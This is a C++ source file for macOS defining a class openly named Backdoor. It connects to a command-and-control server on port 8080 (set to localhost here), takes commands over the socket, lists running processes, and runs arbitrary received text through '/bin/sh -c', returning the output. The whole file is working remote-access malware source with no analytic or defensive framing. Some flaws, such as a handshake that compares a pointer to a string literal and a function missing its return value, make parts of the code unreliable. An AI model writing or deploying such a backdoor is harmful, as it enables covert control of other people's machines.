#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <regex>
#include <stdlib.h>
#include <libproc.h>
#include <stdio.h>
#include <string>
#include <sys/proc_info.h>
#include <sstream>
#define PORT 8080

class Backdoor
{
public:
    int sock = 0;
    struct sockaddr_in serv_addr;


    int start()
    {
        if(!connect_to_c2())
        {
            return -1;
        }
        while(true)
        {
            get_command("give me a command");
        }
        return 1;
    }

    int connect_to_c2()
    {
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        {
            return -1;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);

        if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0)
        {
            return -1;
        }

        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
        {
            return -1;
        }
        return 1;
    }

    int handshake(char* buffer)
    {
        if(buffer =="hello from server")
        {
            return 1;
        }
        return -1;
    }

    std::string get_process_list()
    {
        int numberOfProcesses = proc_listpids(PROC_ALL_PIDS, 0, NULL, 0);
        pid_t pids[numberOfProcesses];
        bzero(pids, sizeof(pids));
        proc_listpids(PROC_ALL_PIDS, 0, pids, sizeof(pids));
        std::string process_list;
        for (int i = 0; i < numberOfProcesses; ++i) {
            if (pids[i] == 0) { continue; }
            char pathBuffer[PROC_PIDPATHINFO_MAXSIZE];
            bzero(pathBuffer, PROC_PIDPATHINFO_MAXSIZE);
            proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer));
            if (strlen(pathBuffer) > 0) {
                printf("path: %s\n", pathBuffer);
                std::string process(pathBuffer);
                process_list.append(process + "\n");
            }
        }
        return process_list;
    }

    std::string run_shell(std::string command)
    {
        std::string command_string = "/bin/sh -c '" + command + "'";
        char buff[100];
        std::snprintf(buff, sizeof(buff), "/bin/sh -c '%s'", command.c_str());
        FILE * file = popen(buff,"r");

        if( file )
        {
            std::ostringstream stm ;

            constexpr std::size_t MAX_LINE_SZ = 1024 ;
            char line[MAX_LINE_SZ] ;

            while( fgets( line, MAX_LINE_SZ, file ) ) stm << line << '\n' ;

            pclose(file) ;
            return stm.str() ;
        }
        return "" ;
    }

    std::string parse_command(char * command)
    {
        std::string command_string(command);
        std::regex newlines_re("\n+");
        std::string command_trimmed = std::regex_replace(command_string, newlines_re, "");

        if(command_trimmed == "exit" or command_trimmed == "quit")
        {
            exit(0);
        }
        else if(command_trimmed == "ps")
        {
            return get_process_list();
        }
        else if(command_trimmed == "echo")
        {
            return "message from client";
        }
        else if(command_trimmed.find("shell ") == 0)
        {
            return run_shell(command_trimmed.substr(6, command_trimmed.length()));
        }
        else
        {
            return run_shell(command);
        }
    }

    int get_command(char * message)
    {
        char buffer[256] = {0};
        int server_response = recv(sock , &buffer, 256, 0);
        if(server_response <= 0)
        {
            return -1;
        }
        std::cout << "received command: " << buffer << std::endl;
        std::string result = parse_command(buffer);
        if(!send(sock, result.c_str(), result.length(), 0))
        {
            return -1;
        }
    }
};

int main()
{
    Backdoor back;
    back.start();
    return 0;
}
